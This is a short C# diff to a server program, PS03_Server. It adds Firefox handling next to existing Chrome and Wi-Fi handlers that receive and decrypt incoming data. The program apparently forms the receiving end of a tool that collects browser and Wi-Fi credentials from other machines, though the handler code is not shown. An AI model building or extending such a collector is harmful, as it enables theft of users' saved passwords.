@@ -6,6 +6,7 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using ConsoleApplication1;
 
 namespace PS03_Server
 {
@@ -13,6 +14,8 @@ namespace PS03_Server
     {
         static ChromeHandler chromehandler = new ChromeHandler();
         static WifiHandler wifihandler = new WifiHandler();
+        static FirefoxHandler firefoxhandler = new FirefoxHandler();
+
 
         static void Main(string[] args)
         {
@@ -45,6 +48,8 @@ namespace PS03_Server
             string unencrypted = dec.DecryptString(data);
             if (unencrypted.StartsWith("CHROME:"))
                 chromehandler.Handle(unencrypted);
+            else if(unencrypted.StartsWith("FIREFOX:"))
+                firefoxhandler.Handle(unencrypted);
             else if (unencrypted.StartsWith("WIFI:"))
                 wifihandler.Handle(unencrypted);
 
